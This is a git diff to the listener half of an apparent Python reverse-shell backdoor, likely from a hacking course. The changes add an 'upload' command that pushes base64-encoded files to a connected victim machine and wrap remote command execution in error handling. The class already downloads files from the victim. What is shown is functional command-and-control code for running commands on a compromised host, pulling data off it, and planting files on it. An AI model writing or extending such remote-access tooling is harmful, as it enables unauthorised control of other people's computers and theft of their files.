@@ -3,6 +3,7 @@
 # https://www.tutorialspoint.com/python/python_networking.htm
 import base64
 import json
+import os
 import socket
 
 import chardet
@@ -39,8 +40,11 @@ class Listener:
             exit()
         elif command[0] == "download" and len(command) > 1:
             return self.receive_file(command[1])
+        elif command[0] == "upload" and len(command) > 1:
+            return self.send_file(command[1])
 
         return self.reliable_receive()
+
 
     def receive_file(self, path):
         total_receive = 0
@@ -49,10 +53,7 @@ class Listener:
             encoded = self.connection.recv(1024)
             byte_data = base64.b64decode(encoded)
             if not byte_data:
-                print("The End")
-                break
-            if encoded == base64.b64encode(b""):
-                print("The End B")
+                print("[-] The End")
                 break
 
             eof = b"pp-00-11-22-ff"
@@ -71,6 +72,15 @@ class Listener:
         # print(self.read_file(path))
         return "[+] Download successful. File size " + str(total_receive) + " bytes"
 
+    def send_file(self, path):
+        file = self.read_file(path)
+        print("[+] Sending file...")
+        self.connection.sendall(file)
+
+        eof = base64.b64encode(b"pp-00-11-22-ff")
+        print("[+] Sending EOF flag...", eof)
+        self.connection.send(eof)
+
     def read_file(self, path):
         with open(path, "rb") as file:
             return base64.b64encode(file.read())
@@ -85,7 +95,10 @@ class Listener:
             command = input(">> ")
             # command = raw_input(">> ") #  python 2
             command = command.split(" ")
-            result = self.execute_remotely(command)
+            try:
+                result = self.execute_remotely(command)
+            except Exception:
+                result = "[-] Error during command execution. Listener side."
             print(result)
 
     def decode(self, data):
